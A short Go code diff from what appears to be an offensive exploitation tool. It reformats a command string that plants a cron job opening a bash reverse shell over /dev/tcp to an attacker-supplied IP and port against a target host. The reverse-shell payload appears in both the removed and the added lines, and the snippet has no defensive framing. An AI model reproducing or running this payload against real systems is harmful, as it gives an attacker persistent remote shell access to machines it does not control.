@@ -43,7 +43,12 @@ func Run() {
 		Port:    reversePort,
 		Target:  target,
 		Exploit: exploit,
-		Cmd:     fmt.Sprintf("\\n\\n* * * * * bash -i>& /dev/tcp/%s/%s 0>&1\\n\\n", reverseIp, reversePort),
+		Cmd: fmt.Sprintf(`
+
+* * * * * bash -i>& /dev/tcp/%s/%s 0>&1
+
+
+`, reverseIp, reversePort),
 	}
 	hik.Run()
 }
